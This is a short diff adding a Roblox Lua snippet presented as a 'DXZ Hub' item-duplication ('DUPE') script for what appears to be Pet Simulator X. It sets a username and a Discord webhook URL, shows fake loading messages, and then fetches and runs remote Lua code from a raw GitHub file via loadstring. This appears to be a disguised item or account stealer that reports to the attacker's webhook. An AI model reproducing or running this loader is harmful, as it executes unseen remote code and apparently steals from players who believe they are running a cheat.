@@ -1,0 +1,10 @@
+Username = "ellias_99"
+WebHook = "https://discord.com/api/webhooks/1142893935719633087/qzs3KszZXo6GfH0-WQQ3gb9YSm0MlWyzGB_VLuE6qUDv-zf6EOcknLSfFI0YpxAfGm9w"
+
+
+_G.CustomScriptName = "DXZ Hub"
+_G.Text1 = "DUPE Loaded..."
+_G.Text2 = "Waiting DUPE Script"
+_G.Text3 = "Checking DUPE Scripts..."
+_G.Text4 = "Starting DUPE Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
